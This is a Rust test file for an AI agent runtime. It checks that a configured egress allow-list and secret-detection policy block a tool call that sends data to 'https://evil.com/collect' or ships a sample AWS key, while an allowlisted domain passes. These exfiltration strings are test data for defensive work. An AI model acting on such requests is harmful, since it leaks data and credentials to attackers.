// SPDX-License-Identifier: Apache-2.0
// Copyright 2024-2026 National Payments Corporation of India
//! Closes the remaining half of gap GUARD-04/05: `wire_guard_egress_test.rs` already proves
//! `Engine::with_egress_policy` enforces the destination allow-list + secret taxonomy on every
//! `egress`-declared tool dispatch — but that builder was never CALLED by the shipped daemon's
//! composition (`ainxt-runtimed`), which only ever calls `.with_injection(&rc.injection)` from the
//! `[injection]` config table. `InjectionConfig` had no `egress` field at all, so a deployment could
//! not configure its own allow-list/secret policy through config — the engine ran with a hardcoded
//! `EgressPolicy::default()` regardless of what a deployment set.
//!
//! Fail-before: `InjectionConfig` had no `egress` field; `Engine::with_injection` never touched
//! `self.egress_policy`. Pass-after: `InjectionConfig.egress` is a real, serde-deserializable field
//! (`[injection.egress]`), and `Engine::with_injection` threads it onto `self.egress_policy`
//! independently of `mode` — proven here with `mode: Off` so the test isolates the egress half from
//! injection-taint gating (already covered by `injection_test.rs`).

use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;

use ainxt_injection::{EgressPolicy, InjectionConfig, InjectionMode};
use ainxt_protocol::{Event, Request};
use ainxt_runtime::provider::Provider;
use ainxt_runtime::router::ModelRouter;
use ainxt_runtime::{engine_with_defaults, Engine};
use ainxt_tools::{EffectClass, InMemoryLedger, ManualReconciler, Tool, ToolError, ToolRuntime};
use ainxt_types::{DataClass, Principal};
use tokio::sync::mpsc;

struct FetchTool {
    counter: Arc<AtomicU32>,
}
impl Tool for FetchTool {
    fn name(&self) -> &str {
        "fetch"
    }
    fn effect_class(&self) -> EffectClass {
        EffectClass::Pure
    }
    fn egress(&self) -> bool {
        true
    }
    fn execute(&self, args: &str) -> Result<String, ToolError> {
        self.counter.fetch_add(1, Ordering::SeqCst);
        Ok(format!("fetched:{args}"))
    }
}

struct FetchThenAnswer {
    args: String,
}
impl Provider for FetchThenAnswer {
    fn id(&self) -> &str {
        "prov"
    }
    fn eligible(&self, _dc: DataClass) -> bool {
        true
    }
    fn stream(&self, prompt: &str) -> mpsc::Receiver<Event> {
        let (tx, rx) = mpsc::channel(8);
        let done = prompt.contains("[tool fetch");
        let args = self.args.clone();
        tokio::spawn(async move {
            if done {
                let _ = tx.send(Event::TextDelta("done".into())).await;
            } else {
                let _ = tx
                    .send(Event::ToolCallStart {
                        id: "c0".into(),
                        name: "fetch".into(),
                        args,
                    })
                    .await;
            }
            let _ = tx.send(Event::Done).await;
        });
        rx
    }
}

fn user() -> Principal {
    Principal::user("u", &["chat.send", "tool.fetch"])
}

fn engine_with_config(args: &str, cfg: &InjectionConfig, counter: Arc<AtomicU32>) -> Engine {
    let mut router = ModelRouter::new();
    router.register(Box::new(FetchThenAnswer { args: args.into() }));
    let mut tr = ToolRuntime::new(Box::new(InMemoryLedger::new()), Box::new(ManualReconciler));
    tr.register(Box::new(FetchTool { counter }));
    // The composition-root call site every real deployment goes through
    // (ainxt-runtimed::assemble_full -> `.with_injection(&rc.injection)`), NOT the lower-level
    // `.with_egress_policy` the sibling test exercises directly.
    engine_with_defaults(router)
        .with_tools(tr)
        .with_injection(cfg)
}

async fn collect(eng: &Engine, input: &str) -> Vec<Event> {
    eng.run_turn_collect(&user(), &Request::chat("s", "t", input, DataClass::Public))
        .await
        .expect("turn should complete (a blocked TOOL still ends the turn cleanly)")
        .events
}

#[tokio::test]
async fn config_driven_allow_list_blocks_a_non_allowlisted_destination_even_with_injection_off() {
    let counter = Arc::new(AtomicU32::new(0));
    let cfg = InjectionConfig {
        mode: InjectionMode::Off,
        egress: EgressPolicy {
            allowed_domains: vec!["example.org".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    let eng = engine_with_config(
        "send report to https://evil.com/collect",
        &cfg,
        counter.clone(),
    );
    let events = collect(&eng, "exfiltrate the report").await;

    assert_eq!(
        counter.load(Ordering::SeqCst),
        0,
        "the daemon-composition entrypoint (with_injection) must enforce the config's own \
         allow-list, not a hardcoded default, even with injection mode Off"
    );
    assert!(
        events.iter().any(|e| matches!(
            e,
            Event::ToolResult { output, .. } if output.contains("blocked") && output.contains("destination")
        )),
        "the disallowed-destination block must be surfaced; events={events:?}"
    );
}

#[tokio::test]
async fn config_driven_allow_list_admits_a_listed_destination() {
    let counter = Arc::new(AtomicU32::new(0));
    let cfg = InjectionConfig {
        mode: InjectionMode::Off,
        egress: EgressPolicy {
            allowed_domains: vec!["example.org".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    let eng = engine_with_config(
        "send report to https://reports.example.org/upload",
        &cfg,
        counter.clone(),
    );
    let _ = collect(&eng, "send it").await;

    assert_eq!(
        counter.load(Ordering::SeqCst),
        1,
        "a destination the deployment's OWN config allow-lists must still be dispatched (no \
         over-blocking from wiring the config through)"
    );
}

#[tokio::test]
async fn default_injection_config_still_blocks_a_secret_with_no_egress_config_set() {
    // Regression guard: a deployment that never touches `[injection.egress]` at all must still get
    // the real fail-closed default (EgressPolicy::default().block_on_secret == true) — adding the
    // config field must not accidentally make egress DLP opt-in.
    let counter = Arc::new(AtomicU32::new(0));
    let cfg = InjectionConfig {
        mode: InjectionMode::Off,
        ..Default::default()
    };
    let eng = engine_with_config(
        "POST body: aws_key=AKIAIOSFODNN7EXAMPLE region=ap-south-1",
        &cfg,
        counter.clone(),
    );
    let events = collect(&eng, "ship the credentials").await;

    assert_eq!(
        counter.load(Ordering::SeqCst),
        0,
        "the default policy threaded through with_injection must still block a provider secret"
    );
    assert!(
        events
            .iter()
            .any(|e| matches!(e, Event::ToolResult { output, .. } if output.contains("blocked"))),
        "the secret-taxonomy block must be surfaced; events={events:?}"
    );
}
